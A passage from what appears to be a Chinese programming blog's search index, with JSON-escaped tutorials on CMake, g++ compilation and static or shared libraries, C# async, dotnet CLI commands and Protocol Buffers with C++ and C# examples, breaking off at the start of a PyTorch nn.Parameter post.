├── CMakeLists.txt ├── include │ └── invsqrt.h └── src ├── invsqrt.cpp └── main.cpp    tips: 在C++工程中，我们通常在include/目录下放置头文件，在src/目录下放置源文件。\n 该项目的CMakeLists.txt中需要添加以下内容：\n1 2 3 4 5 6 7 8 9 10 11 12  # build part cmake_minimum_required(VERSION 3.5)project(invsqrt)set(SOURCES src/invsqrt.cpp src/main.cpp)add_executable(invsqrt ${SOURCES})target_include_directories(invsqrt PUBLIC ${PROJECT_SOURCE_DIR}/include)# debug part message(\u0026#34;CMAKE_SOURCE_DIR: ${CMAKE_SOURCE_DIR}\u0026#34;)message(\u0026#34;PROJECT_SOURCE_DIR: ${PROJECT_SOURCE_DIR}\u0026#34;)message(\u0026#34;SOURCES: ${SOURCES}\u0026#34;)   语法总结2\n set(\u0026lt;variable\u0026gt; \u0026lt;value\u0026gt;) 设置变量 target_include_directories(\u0026lt;project_name\u0026gt; \u0026lt;INTERFACE|PUBLIC|PRIVATE\u0026gt; \u0026lt;headfile_directory\u0026gt;) 指定所要包含的头文件。 message(\u0026quot;your message\u0026quot;) 在终端打印信息。   这里需要特别说明一下CMake中的变量使用。CMake中的变量分为两种：\n 显式变量：使用set指令定义的变量。 隐式变量：通过其它指令隐式生成的变量。如该项目中会隐式生成PROJECT_SOURCE_DIR变量，默认为CMakeLists.txt所在的文件夹。  CMake中有丰富的变量，用于定义工程目录、编译选项等，此处不做过多展开。想要了解更多，可以参考文末列出的参考文档。\n3 静态库和动态库 有些时候，出于方便复用、防止源码泄露等原因，我们需要将代码封装为静态库和动态库。CMake同样提供了生成静态库和动态库的功能。\n3.1 静态库 在此处，我们将上一小节中计算平方根倒数的程序封装为静态库。项目结构如下：\n1 2 3 4 5 6 7  . ├── CMakeLists.txt ├── include │ └── invsqrt.h └── src ├── invsqrt.cpp └── main.cpp   该项目的CMakeLists.txt中需要添加以下内容：\n1 2 3 4 5 6 7 8 9 10  cmake_minimum_required(VERSION 3.5)project(invsqrt)# create static library add_library(invsqrt_static STATIC src/invsqrt.cpp)target_include_directories(invsqrt_static PUBLIC ${PROJECT_SOURCE_DIR}/include)# create executable add_executable(invsqrt src/main.cpp)target_link_libraries(invsqrt PRIVATE invsqrt_static)   语法总结3\n add_library(\u0026lt;library_name\u0026gt; STATIC \u0026lt;cppfile_name\u0026gt;) 生成静态库 target_link_libraries(\u0026lt;executable\u0026gt; \u0026lt;INTERFACE|PUBLIC|PRIVATE\u0026gt; \u0026lt;library_name\u0026gt;) 指定所要链接的库。   此处我们使用一种更为优雅的生成方式——我们期望将生成的静态库、可执行文件输出到build文件夹里，而不是和主项目混杂在一起。为此我们需要输入以下指令：\n1 2 3 4  $ mkdir build $ cd build $ cmake .. # 使用的是上一层目录的CMakeLists.txt，因此需要输入\u0026#39;..\u0026#39; $ make   我们将会在build/目录下看到静态库libinvsqrt_static.a和可执行文件invsqrt。\n3.2 动态库 项目目录结构同静态库一节。\n该项目的CMakeLists.txt中需要添加以下内容：\n1 2 3 4 5 6 7 8 9 10  cmake_minimum_required(VERSION 3.5)project(invsqrt)# create shared library add_library(invsqrt_shared SHARED src/invsqrt.cpp)target_include_directories(invsqrt_shared PUBLIC ${PROJECT_SOURCE_DIR}/include)# create executable add_executable(invsqrt src/main.cpp)target_link_libraries(invsqrt PRIVATE invsqrt_shared)   语法总结4\n add_library(\u0026lt;library_name\u0026gt; SHARED \u0026lt;cppfile_name\u0026gt;) 生成动态库   同样按照上小节的方法生成项目。我们将会在build/目录下看到动态库libinvsqrt_shared.so和可执行文件invsqrt。\n4 使用第三方库 在实际的C++工程中，我们可能需要链接一些开源的第三方库。CMake也提供了相关的配置方式。我们以谷歌开发的单元测试框架googletest为例：\n googletest的安装方法：\n1 2 3 4 5 6 7 8 9  $ git clone https://github.com/google/googletest.git # or git clone git@github.com:google/googletest.git $ cd googletest $ mkdir build $ cd build $ cmake ../ $ make -j all $ make install # or sudo make install     在默认情况下，与该第三方库相关的头文件将会被放置在/usr/local/include目录下，与该第三方库相关的库文件将会被放置在/usr/local/lib目录下，与该第三方库相关的可执行文件将会被放置在/usr/local/bin目录下。\n 项目结构如下：\n1 2 3 4 5 6 7  . ├── CMakeLists.txt ├── include │ └── mysqrt.h └── src ├── mysqrt.cpp └── main.cpp   1 2 3 4 5 6 7 8 9 10 11 12 13 14  cmake_minimum_required(VERSION 2.6)project(cmake_with_gtest)set(SOURCES src/mysqrt.cpp src/main.cpp)find_package(GTest)message(\u0026#34;GTEST_LIBRARIES: ${GTEST_LIBRARIES}\u0026#34;)message(\u0026#34;GTEST_INCLUDE_DIRS: ${GTEST_INCLUDE_DIRS}\u0026#34;)include_directories(${GTEST_INCLUDE_DIRS} ${PROJECT_SOURCE_DIR}/include)add_executable(cmake_with_gtest ${SOURCES})target_link_libraries(cmake_with_gtest ${GTEST_LIBRARIES} pthread)   语法总结5\n find_package(\u0026lt;package_name\u0026gt;) 查询第三方库的位置。若查找成功，则初始化变量\u0026lt;package_name\u0026gt;_INCLUDE_DIR（第三方库的头文件目录）以及\u0026lt;package_name\u0026gt;_LIBRARIES（第三方库的静态/动态库目录）。   CMake支持的所有第三方库可以在https://cmake.org/cmake/help/latest/manual/cmake-modules.7.html中找到。\n写在最后 CMake还有很多强大的功能：\n 设置C++工程的语言标准、编译优化选项。 层级文件之间CMakeLists.txt的相互调用，以便应用于目录层级更加复杂的C++工程。 对生成的库、可执行文件等进行安装。 \u0026hellip;  略过上述内容不会对我们的教学产生太大影响。感兴趣的同学可以参考以下文章：\n CMake官方文档 cmake-examples 该GitHub仓库中有很多开箱即用的CMake实例。 为什么编译c/c++要用makefile，而不是直接用shell呢？ 这篇博文详细地阐述了使用makefile的动机和意义（\\xfgg/）。 跟我一起写Makefile Makefile教程。从中大家也可以看出Makefile的语法十分不友好\u0026hellip;  ","date":"2022-06-23T20:47:58+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/cmake/","title":"Makefile \u0026 CMake"},{"content":"目录 [TOC]\n前言 在程设课上，我们运行一个C++程序的步骤通常是这样的：打开Visual Studio 2008，在文件中写好程序，然后点击“开始调试”或者“开始执行（不调试）”，一个黑色的方框就会弹出来。\n实际上，从C++源代码文件到可执行文件的过程是十分复杂的，Visual Studio等现代化的IDE（Integrated Development Environment，集成开发环境）掩盖了程序构建的复杂流程。本节我们就以linux平台上的C++程序为例，简略介绍C++工程中的一些概念。\n为了获得更好的实验体验，建议大家使用linux操作系统（虚拟机或WSL）来运行本节的程序。\n本讲需要使用到的工具有：gcc，g++。可以通过以下方式安装：\n1  $ sudo apt-get install gcc g++   从.cpp到.exe —— C/C++程序的构建过程 C/C++程序生成一个可执行文件的过程可以分为4个步骤：预处理（Preprocessing）、编译（Compiling）、汇编（Assembly）和链接（Linking）。之后我们将通过演示实例介绍每一步发生的故事。\n编译工具 针对不同的应用场景和平台，各大厂家设计了不同的C++编译工具。\n  MSVC（Microsoft Visual C++）：MSVC是微软公司开发的C++开发工具，我们程设课上使用的Visual Studio就内置了MSVC。\n  GCC（GNU Compiler Collection）：GCC是由GNU（GNU\u0026rsquo;s Not Unix）开发的一套编译工具，支持C、C++、Fortran、Go等一系列语言。本教程中我们使用的编译工具就是GCC。\nGCC提供给用户的前端程序为gcc（针对C）和g++（针对C++）。它们的区别详见gcc vs g++。\n  此外还有Clang、NVCC等编译工具。不同的编译工具对C++的支持不尽然相同，此处不再赘述。\n  1 预处理 C++程序在预处理阶段会执行以下操作：宏的替换、头文件的插入、删除条件编译中不满足条件的部分。\n1  $ g++ –E invsqrt.cpp –o invsqrt.i   2 编译 C++程序在编译阶段会将C++文件转换为汇编文件。\n1 2 3 4  # from .i file $ g++ –S invsqrt.i –o invsqrt.s # from .cpp file $ g++ –S invsqrt.cpp –o invsqrt.s   3 汇编 汇编语言文件经过汇编，生成目标文件.o文件（二进制文件，机器码），每一个源文件都对应一个目标文件。\n1 2 3 4 5  # from .s file $ g++ –c invsqrt.s –o invsqrt.o # from .cpp file $ g++ –c invsqrt.cpp –o invsqrt.o $ g++ -c main.cpp -o main.o    生成的invsqrt.o和main.o文件不能直接打开，你可以使用readelf -a \u0026lt;object file\u0026gt;阅读其信息。\n 4 链接 每个源文件对应的目标.o文件被链接起来，就生成一个可执行程序文件。\n1  $ g++ invsqrt.o main.o -o main.exe   当然，如果想要使用.cpp文件一步到位生成可执行文件，可以使用以下指令：\n1  $ g++ invsqrt.cpp main.cpp -o main.exe    实际上在linux系统上，可执行文件一般是没有后缀名的。此处为了方便说明添加了.exe文件。\n  语法总结\ng++和gcc工具中使用的一些命令行参数：\n  -E 只进行预处理\n  -S 只进行编译\n  -c 只生成目标文件\n  -o \u0026lt;file\u0026gt; 指定输出文件的名称。我们约定：.i为预处理后的文件，.s为汇编文件，.o为目标文件。\n   静态库和动态库 出于便于复用、封装细节或防止源码泄露等原因，在实际应用过程中，我们需要把C++源码封装为库(library)。\n根据其行为不同，可以将库分为静态库(static library)和动态库(shared library)。\n静态库 静态库的代码在编译的过程中，会被直接载入到可执行文件中。这样做的好处是：可执行文件在执行时，不再需要静态库本身。但缺点也显而易见：生成的可执行文件的体积会比较大。\nlinux平台下静态库的后缀通常为.a，命名方式通常为libxxx.a;windows平台下静态库的后缀通常为.lib。\n在linux平台上生成静态库，并使用动态库链接形成可执行文件的方法为：\n1 2 3 4  # generate static lib $ ar crv libinvsqrt.a invsqrt.cpp # link to generate the executable file $ g++ -static main.cpp -L . -linvsqrt -o main_shared.exe   动态库 动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。这就带来了一个明显的好处：不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，减小了各个模块之间的耦合程度，也减小了可执行文件的体积。然而，这也要求用户的电脑上需要同时拥有可执行文件和动态库，也有可能因为版本不匹配等问题发生DLL Hell等问题。\nlinux平台下静态库的后缀通常为.so，命名方式通常为libxxx.so;windows平台下静态库的后缀通常为.dll。\n在linux平台上生成动态库，并使用动态库链接形成可执行文件的方法为：\n1 2 3 4  # generate shared lib $ g++ invsqrt.cpp -I ./ -fPIC -shared -o libinvsqrt.so # link to generate the executable file $ g++ main.cpp -L . -linvsqrt -o main_shared.exe   写在最后 由于时间所限，还有很多有趣的内容我们没有涉及：\n gcc/g++有着丰富的命令行参数设置，比如程序优化、C/C++语言标准设置等。 在本节中，我们只介绍了如何在linux平台上生成和使用静态库、动态库。实际上，利用Visual Studio也可以便捷地在windows平台上生成静态库、动态库。 \u0026hellip;  略过上述内容不会对我们的教学产生太大影响。感兴趣的同学可以参考以下文档：\n GCC官网 learn cpp 一份新手友好的C++入门文档。 演练：使用Visual Studio创建并使用静态库 演练：使用Visual Studio创建并使用动态库  ","date":"2022-06-23T20:47:58+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/compile/","title":"编译、链接、静态库、动态库"},{"content":"C# async 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118  using System; using System.Collections.Generic; using System.Threading.Tasks; namespace AsyncBreakfast { // These classes are intentionally empty for the purpose of this example. They are simply marker classes for the purpose of demonstration, contain no properties, and serve no other purpose. internal class Bacon { } internal class Coffee { } internal class Egg { } internal class Juice { } internal class Toast { } class Program { static async Task Main(string[] args) { Coffee cup = PourCoffee(); Console.WriteLine(\u0026#34;coffee is ready\u0026#34;); var eggsTask = FryEggsAsync(2); // save the task  var baconTask = FryBaconAsync(3); var toastTask = MakeToastWithButterAndJamAsync(2); var breakfastTasks = new List\u0026lt;Task\u0026gt; { eggsTask, baconTask, toastTask }; while (breakfastTasks.Count \u0026gt; 0) { Task finishedTask = await Task.WhenAny(breakfastTasks); // use this code to await an async process if (finishedTask == eggsTask) { Console.WriteLine(\u0026#34;eggs are ready\u0026#34;); } else if (finishedTask == baconTask) { Console.WriteLine(\u0026#34;bacon is ready\u0026#34;); } else if (finishedTask == toastTask) { Console.WriteLine(\u0026#34;toast is ready\u0026#34;); } breakfastTasks.Remove(finishedTask); } Juice oj = PourOJ(); Console.WriteLine(\u0026#34;oj is ready\u0026#34;); Console.WriteLine(\u0026#34;Breakfast is ready!\u0026#34;); } // combine an async task and a simple task static async Task\u0026lt;Toast\u0026gt; MakeToastWithButterAndJamAsync(int number) { var toast = await ToastBreadAsync(number); ApplyButter(toast); ApplyJam(toast); return toast; } private static Juice PourOJ() { Console.WriteLine(\u0026#34;Pouring orange juice\u0026#34;); return new Juice(); } private static void ApplyJam(Toast toast) =\u0026gt; Console.WriteLine(\u0026#34;Putting jam on the toast\u0026#34;); private static void ApplyButter(Toast toast) =\u0026gt; Console.WriteLine(\u0026#34;Putting butter on the toast\u0026#34;); private static async Task\u0026lt;Toast\u0026gt; ToastBreadAsync(int slices) { for (int slice = 0; slice \u0026lt; slices; slice++) { Console.WriteLine(\u0026#34;Putting a slice of bread in the toaster\u0026#34;); } Console.WriteLine(\u0026#34;Start toasting...\u0026#34;); await Task.Delay(3000); Console.WriteLine(\u0026#34;Remove toast from toaster\u0026#34;); return new Toast(); } private static async Task\u0026lt;Bacon\u0026gt; FryBaconAsync(int slices) { Console.WriteLine($\u0026#34;putting {slices} slices of bacon in the pan\u0026#34;); Console.WriteLine(\u0026#34;cooking first side of bacon...\u0026#34;); await Task.Delay(3000); for (int slice = 0; slice \u0026lt; slices; slice++) { Console.WriteLine(\u0026#34;flipping a slice of bacon\u0026#34;); } Console.WriteLine(\u0026#34;cooking the second side of bacon...\u0026#34;); await Task.Delay(3000); Console.WriteLine(\u0026#34;Put bacon on plate\u0026#34;); return new Bacon(); } private static async Task\u0026lt;Egg\u0026gt; FryEggsAsync(int howMany) { Console.WriteLine(\u0026#34;Warming the egg pan...\u0026#34;); await Task.Delay(3000); Console.WriteLine($\u0026#34;cracking {howMany} eggs\u0026#34;); Console.WriteLine(\u0026#34;cooking the eggs ...\u0026#34;); await Task.Delay(3000); Console.WriteLine(\u0026#34;Put eggs on plate\u0026#34;); return new Egg(); } private static Coffee PourCoffee() { Console.WriteLine(\u0026#34;Pouring coffee\u0026#34;); return new Coffee(); } } }   ","date":"2022-06-22T10:40:10+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/csharp_async/","title":"Csharp async"},{"content":"dotnet build 生成一个.NET工程。目录下必须有.sln文件或.csproj文件。\ndotnet publish 生成一个.NET工程的发布版本。目录下必须有.sln文件或.csproj文件。\ndotnet run 启动一个.NET工程。目录下必须有.csproj文件。\ndotnet clean 清除一个.NET工程的所有编译文件。目录下必须有.sln文件或.csproj文件。\ndotnet list package 查看一个.NET工程的所有依赖包。目录下必须有.sln文件或.csproj文件。\ndotnet list reference 列举项目的所有依赖项。目录下必须有.csproj文件。\ndotnet add package \u0026lt;PACKAGE_NAME\u0026gt; --version \u0026lt;VERSION\u0026gt; 添加一个依赖包。目录下必须有.csproj文件。\n publish命令和build命令最大的区别在于：publish命令将应用程序的依赖项，从NuGet缓存复制到输出文件夹中。\n ","date":"2022-06-21T17:59:46+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/csharp_on_linux/","title":"Csharp on Linux"},{"content":"Protobuf 目录 [TOC]\n数据的传输与解析——浅谈序列化与反序列化 在网络通信的过程中，服务器端和客户端之间常常需要进行对象的传输。对象中常常含有不同的变量：\n 整数 字符串 数组 数组对象 \u0026hellip;  那么我们如何正确地进行这种传递呢？要想实现对象的传输，在发送端我们需要使用一定的规则，将对象转换为具体的字节数组，这就是序列化(serialization)；而在接受端再以这种规则将字节数组还原为对象，这就是反序列化(deserialization)。\n常见的序列化-反序列化协议有XML、JSON、Protobuf。\n XML(eXtensible Markup Language，可扩展标记语言)使用标签\u0026lt;xx\u0026gt;和\u0026lt;/xx\u0026gt;来区隔不同的数据。 JSON(JavaScript Object Notation，JavaScript对象简谱)使用JavaScript构造对象的方法来存储、传输数据。 Protobuf(Protocol Buffers)是Google公司开源跨平台的序列化数据结构的协议。  我们通过一个实例说明三者的差异。我们不妨定义以下对象：\n1 2 3 4 5 6 7 8 9 10 11 12  #include \u0026lt;string\u0026gt; class Helloworld { int id; std::string name; } int main() { Helloworld helloworld(101, \u0026#34;hello\u0026#34;); }   使用XML序列化该对象：\n1 2 3 4  \u0026lt;helloworld\u0026gt; \u0026lt;id\u0026gt;101\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;hello\u0026lt;/name\u0026gt; \u0026lt;/helloworld\u0026gt;   使用JSON序列化该对象：\n1 2 3 4  { \u0026#34;id\u0026#34;: 101, \u0026#34;name\u0026#34;: \u0026#34;hello\u0026#34; }   使用Protobuf序列化该对象（16进制格式）：\n1  08 65 12 06 48 65 6C 6C 6F 77   根据上述实例，我们可以用一张表格总结三者的差异：\n    XML JSON Protobuf     数据存储格式 文本 文本 二进制   可读性 好 较好 差   存储空间 大 较大 小   序列化/反序列速度 慢 慢 快   侧重点 数据结构化 数据结构化 数据序列化     本节我们将重点介绍Protobuf的使用方法。但XML及其各种变体（如HTML、XAML）和JSON也在软件部的后续开发中有着广泛应用。感兴趣的同学可以参考相关资料了解XML和JSON的更多使用方法。\n protobuf的安装 protobuf可以通过以下方式安装（参考自Protobuf C++ Installation）\n1 2 3 4 5 6 7 8 9 10 11 12  $ sudo apt-get install autoconf automake libtool curl make g++ unzip # 安装所需要的工具包 $ git clone https://github.com/protocolbuffers/protobuf.git # 若网络不佳，可以将指令换为 git clone https://gitee.com/mirrors/protobuf_source.git ./protobuf $ cd protobuf # (optional) git submodule update --init --recursive $ git checkout 3.20.x # 根据版本需求选择不同的分支 $ ./autogen.sh $ ./configure $ make -j$(nproc) $ sudo make install $ sudo ldconfig   以上操作会将protoc可执行文件（后续教程会介绍其使用方法）以及与protobuf相关的头文件、库安装至本机。在终端输入protoc，若输出提示信息，则表示安装成功。\nproto文件 基础使用 在使用protobuf时，我们首先需要在.proto文件中将需要被序列化的数据结构进行定义。\n一个.proto文件示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // import \u0026#34;other_protos.proto\u0026#34;; // 如果需要引用其它的protobuf文件，可以使用import语句。 syntax = \u0026#34;proto3\u0026#34;; // 指定protobuf遵循的语法格式是proto2还是proto3。在本教程和之后的开发中，我们都使用proto3语法格式。 package student; // 包名声明。如在本例中，proto文件生成的类都会被放在namespace student中，这一举措的意义在于防止命名冲突 enum Sex // 自定义枚举类型 { MALE = 0; FEMALE = 1;}message Course // protobuf中，使用message定义数据结构，类似于C中的结构体 { int32 credit = 1; string name = 2;}message StudentInfo{ // 变量声明格式 \u0026lt;限定修饰符\u0026gt; \u0026lt;数据类型\u0026gt; \u0026lt;变量名\u0026gt;=id  int32 age = 1; string name = 2; Sex sex = 3; repeated Course courses = 4; // repeated表示重复（数组），本例也表明message可以嵌套message }  protobuf语法标准 protobuf有两套语法标准：proto2和proto3，两套语法不完全兼容。我们可以使用syntax关键字指定protobuf遵循的语法标准。\npackage 为了防止命名冲突，protobuf文件中可以声明包名（package）。具体效果将在后续章节介绍。\n编号 消息定义中的每个字段都有一个唯一的编号，从1开始。这些字段号用于识别你在二进制格式消息中的信息。\n一个常见的约定是，我们会将经常使用的字段编号为1-15，不常用的字段编号为16以上的数字，因为1-15的编号编码仅需要1 byte，这样可以减小字节流的体积。\n数据类型 Protobuf中常见的基础数据类型与若干编程语言的对应关系如下：\n   proto Type C++ Type Python Type C# Type     double double float double   float float float float   int32 int32 int int   int64 int64 int/long long   uint32 uint32 int/long uint   uint64 uint64 int/long ulong   sint32 int32 int int   sint64 int64 int/long long   fixed32 uint32 int/long uint   fixed64 uint64 int/long ulong   sfixed32 int32 int int   sfixed64 int64 int/long long   bool bool bool bool   string string str/unicode string   bytes string str (Python 2) bytes (Python 3) ByteString    更多语言的对应关系参看Protobuf scalar types。\n此外，Protobuf还支持使用enum关键字定义枚举类型。每个枚举定义都必须包含一个映射到0的常量作为枚举的默认值。\n为了尽可能多地压缩数据，Protobuf对各数据类型地默认值做了以下处理：\n numeric types: 0 bool: false string: 空字符串 byte: 空字节 enum: 第一个定义的枚举值（0） message: 取决于目标编程语言  repeated repeated关键字可以定义重复多次的信息（即数组），其顺序是有序的。\n命名法 为了便于阅读，protobuf规定了一系列命名法：\n message、enum采用大驼峰命名法，如message StudentInfo。 字段采用下划线分割法，且全部小写，如string student_name。 枚举值采用下划线分割法，且全部大写，如FIRST_VALUE。  进阶使用 protobuf中还有一些高级语法：\noneof 如果你有一个信息，它可能包含若干种字段，并且最多只有一个字段会同时被设置（回忆C/C++中的联合体union），你可以使用oneof字段来节省空间。\noneof块中可以定义除了map字段（后续会讲到）和repeated字段外的所有类型字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  syntax = \u0026#34;proto3\u0026#34;;package oneof_demomessage MessageA{\tstring name_a = 1;}message MessageOneof{\toneof test_oneof\t{\tstring name = 1;\tMessageA message_a = 2;\t}}  map map字段可以定义关联映射类型（类似于Python中的字典dict()）。\nmap字段的定义方式如下：map\u0026lt;key_type, value_type\u0026gt; map_field = N;。其中，key_value可以为整数类型或字符串类型，value_type为除map类型的任意类型。\n1 2 3 4 5 6 7  syntax = \u0026#34;proto3\u0026#34;;package map_demomessage StudentInfo{\tmap\u0026lt;int32,string\u0026gt; id_name_pairs = 1;}  除此之外，protobuf中还有很多高阶语法：\n Any 保留字段（Reserved Values） 嵌套类型（Nested Types） \u0026hellip;  此处由于篇幅所限，我们不做过多展开。\n使用proto文件进行序列化和反序列化 生成目标语言文件 编写好的protobuf文件不能直接应用于工程中，我们需要使用protoc工具生成对应的文件（以C++和Csharp为例）：\n1 2 3  $ protoc --help # 查看使用方法 $ protoc test.proto --cpp_out=. # 在当前目录下生成.cpp文件和.h文件 $ protoc test.proto --csharp_out=. # 在当前目录下生成.cs文件   若使用--cpp_out选项，则会生成\u0026lt;protobuf_name\u0026gt;.pb.h文件和\u0026lt;protobuf_name\u0026gt;.pb.cc文件；若使用--csharp_out选项，则会生成\u0026lt;protobuf_name\u0026gt;.cs文件。生成的文件中会将proto文件中定义的message转换为对应的类，供目标语言程序使用。\nC++ 在C++程序中使用protobuf工具的例程如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  #include \u0026lt;iostream\u0026gt;#include \u0026lt;fstream\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;google/protobuf/message.h\u0026gt; // for protobuf #include \u0026#34;test.pb.h\u0026#34; // for protobuf source file int main() { // 可以看到，protobuf文件中的信息都被封装在namespace student中，这是之前protobuf中的`package`语法所规定的。  // 1. 如何实例化一个proto文件中定义的类  student::StudentInfo student1; // 2. 如何设置类的各个属性  // a. 添加单一字段：使用set_\u0026lt;xxx\u0026gt;()语句  student1.set_age(18); student1.set_name(\u0026#34;Alice\u0026#34;); student1.set_sex(student::Sex::female); // b. 添加repeated字段：使用add_\u0026lt;xxx\u0026gt;()语句  student::Course* course1 = student1.add_courses(); course1 -\u0026gt; set_name(\u0026#34;calculus\u0026#34;); course1 -\u0026gt; set_credit(5); student::Course* course2 = student1.add_courses(); course2 -\u0026gt; set_name(\u0026#34;Fundamentals of Electronic Circuits and System\u0026#34;); course2 -\u0026gt; set_credit(2); // 3. 如何使用类的各个属性：使用\u0026lt;xxx\u0026gt;()语句  std::cout \u0026lt;\u0026lt; \u0026#34;----------------student info----------------\u0026#34; \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;age: \u0026#34; \u0026lt;\u0026lt; student1.age() \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;name: \u0026#34; \u0026lt;\u0026lt; student1.name() \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;sex (0:male, 1:female): \u0026#34; \u0026lt;\u0026lt; (int)student1.sex() \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;courses: \u0026#34; \u0026lt;\u0026lt; std::endl; for(int i = 0;i\u0026lt;student1.courses_size();i++) { std::cout \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;. \u0026#34; \u0026lt;\u0026lt; \u0026#34;name: \u0026#34; \u0026lt;\u0026lt; student1.courses(i).name() \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; \u0026#34;credit: \u0026#34; \u0026lt;\u0026lt; student1.courses(i).credit() \u0026lt;\u0026lt; std::endl; } std::cout \u0026lt;\u0026lt; \u0026#34;--------------------------------------------\u0026#34; \u0026lt;\u0026lt; std::endl; // 4. 序列化  std::cout \u0026lt;\u0026lt; \u0026#34;serialize to file.\u0026#34; \u0026lt;\u0026lt; std::endl; std::fstream output(\u0026#34;./output\u0026#34;, std::ios::out | std::ios::binary ); student1.SerializeToOstream(\u0026amp;output); // 序列化为流  std::cout \u0026lt;\u0026lt; \u0026#34;serialize to array.\u0026#34; \u0026lt;\u0026lt; std::endl; size_t size = student1.ByteSizeLong(); unsigned char* data = new unsigned char [size]; student1.SerializeToArray(data, student1.ByteSizeLong()); // 序列化为数组  // 5. 反序列化和debug  std::cout \u0026lt;\u0026lt; \u0026#34;deserialize from array.\u0026#34; \u0026lt;\u0026lt; std::endl; student::StudentInfo studentInfoFromArray; std::cout \u0026lt;\u0026lt; std::endl; studentInfoFromArray.ParseFromArray(data, size); std::cout \u0026lt;\u0026lt; studentInfoFromArray.DebugString() \u0026lt;\u0026lt; std::endl; // 输出字符串化的信息 }   需要指出的是，想要成功生成可执行文件，需要链接protobuf的静态库和动态库。在linux系统上应用使用到protobuf的C++工程，最好的方法是使用CMake。在本例中，库的依赖关系由CMake工具处理。\nCsharp 在Csharp程序中使用protobuf工具的例程如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  using System; using System.IO; using Google.Protobuf; using Student; namespace example { class Program { static void Main(string[] args) { // 1. 如何实例化一个proto文件中定义的类  var student1 = new StudentInfo(); // 2. 如何设置类的各个属性 // a. 添加单一字段（回忆Csharp一讲中的“字段”） student1.Age = 18; student1.Name = \u0026#34;Alice\u0026#34;; student1.Sex = Sex.Female; // b. 添加repeated字段（使用Add()方法） var course1 = new Course(); course1.Name = \u0026#34;calculus\u0026#34;; course1.Credit = 5; student1.Courses.Add(course1); var course2 = new Course(); course2.Name = \u0026#34;Fundamentals of Electronic Circuits and System\u0026#34;; course2.Credit = 2; student1.Courses.Add(course2); // 3. 如何使用类的各个属性（回忆Csharp一讲中的“字段”） Console.WriteLine(\u0026#34;----------------student info----------------\u0026#34;); Console.WriteLine($\u0026#34;age: {student1.Age}\u0026#34;); Console.WriteLine($\u0026#34;name: {student1.Name}\u0026#34;); Console.WriteLine($\u0026#34;sex (0:male, 1:female): {student1.Sex}\u0026#34;); Console.WriteLine($\u0026#34;courses: \u0026#34;); foreach (Course course in student1.Courses) { Console.WriteLine($\u0026#34;name: {course.Name} credit: {course.Credit}\u0026#34;); } // 4. 序列化 Console.WriteLine(\u0026#34;serialize to array.\u0026#34;); byte[] data = new byte[student1.CalculateSize()]; MemoryStream ostream = new MemoryStream(); using (CodedOutputStream output = new CodedOutputStream(ostream, true)) { student1.WriteTo(output); output.Flush(); } data = ostream.ToArray(); // 5. 反序列化和debug Console.WriteLine(\u0026#34;deserialize from array.\u0026#34;); var student2 = new StudentInfo(); MemoryStream istream = new MemoryStream(data); using (CodedInputStream input = new CodedInputStream(istream)) { student2?.MergeFrom(input); } Console.WriteLine(student2); } } }   在Csharp程序中，需要在NuGet程序包中搜索并下载Google.Protobuf安装包。\n 补充说明：如何在Visual Studio中使用NuGet为Csharp程序安装第三方库？\nNuGet是一个自由开源软件包管理系统，作为Visual Studio的一个扩展，可以简化在Visual Studio中添加、更新和删除库的操作。\n我们在开发Csharp程序时不可避免地要用到第三方库，NuGet是一种很好用的工具。以下将以protobuf为例简要介绍NuGet的使用。\n  右键项目，点击“管理NuGet程序包”。\n  点击“浏览”，搜索你想要安装的包名。可以根据项目所需要切换不同的版本。\n  点击安装。在编辑器内输入using Google.Protobuf，若无报错，说明安装成功。\n   写在最后 由于篇幅所限，我们仍然有许多内容没有展开：\n protobuf编码之varint/zigzag protobuf为什么可以获得如此高效的编码效果？这涉及到其底层算法——varint和zigzag算法。 proto2语法和proto3语法的区别。 \u0026hellip;  略去上述内容不会对我们的教学产生太大影响，感兴趣的同学可以参考Protobuf官方文档学习更多知识。\n","date":"2022-06-20T20:07:09+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/protobuf/","title":"Protobuf"},{"content":"Parameters Parameters are Tensor subclasses, that have a very special property when used with Module s - when they’re assigned as Module attributes they are automatically added to the list of its parameters, and will appear e.g. in parameters() iterator.\n简单来讲，nn.Parameters用于注册可供训练的参数。e.g:\n1 2 3 4 5 6  In [6]: a = torch.nn.Parameter(torch.Tensor([0])) In [7]: a Out[7]: Parameter containing: tensor([0.], requires_grad=True)   nn.Parameter默认requires_grad=True\n一些常用参量（用于更新参数等）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 